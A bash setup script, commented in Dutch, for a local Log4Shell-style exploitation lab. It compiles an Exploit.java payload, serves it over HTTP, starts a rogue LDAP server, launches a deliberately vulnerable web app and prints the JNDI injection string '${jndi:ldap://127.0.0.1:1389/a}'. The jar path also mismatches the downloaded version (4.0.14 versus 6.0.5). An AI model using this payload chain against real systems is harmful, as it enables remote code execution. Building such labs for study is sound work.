#!/bin/bash

set -e

ROOT_DIR=$(dirname "$(realpath "$0")")/..
cd "$ROOT_DIR"

# Installeer dependencies
LDAP_JAR_URL="https://repo1.maven.org/maven2/com/unboundid/unboundid-ldapsdk/6.0.5/unboundid-ldapsdk-6.0.5.jar"
LDAP_JAR_PATH="webapp/libs/unboundid-ldapsdk-4.0.14.jar"

if [ ! -d "webapp/libs" ]; then
    echo "[*] Creating webapp/libs directory..."
    mkdir -p webapp/libs
fi

# Stap 1: Download LDAP SDK indien nodig
if [ ! -f "$LDAP_JAR_PATH" ]; then
    echo "[*] Downloading UnboundID LDAP SDK..."
    wget -q -O "$LDAP_JAR_PATH" "$LDAP_JAR_URL"
else
    echo "[*] UnboundID LDAP SDK already present."
fi

# Stap 1: Compileer Exploit.java
echo "[*] Compiling exploit payload..."
cd exploit
javac Exploit.java

# Stap 2: Start HTTP-server in achtergrond
echo "[*] Starting HTTP server on port 8000..."
python3 -m http.server 8000 > /dev/null 2>&1 &
HTTP_PID=$!
cd ..

# Stap 3: Start LDAP-server in achtergrond
echo "[*] Starting LDAP server on port 1389..."
cd ldap
javac -cp ".:../webapp/libs/unboundid-ldapsdk-6.0.5.jar" LDAPServer.java
java -cp ".:../webapp/libs/*:../webapp/libs/unboundid-ldapsdk-6.0.5.jar" LDAPServer > /dev/null 2>&1 &

LDAP_PID=$!
cd ..

# Stap 4: Start webapp
echo "[*] Starting vulnerable web app..."
cd scripts
chmod +x setup.sh
./setup.sh &

echo ""
echo "[âœ“] Alles draait nu! Test met payload:"
echo '${jndi:ldap://127.0.0.1:1389/a}'
echo ""
echo "HTTP-server PID: $HTTP_PID"
echo "LDAP-server PID: $LDAP_PID"
echo "Webapp: http://localhost:8080"
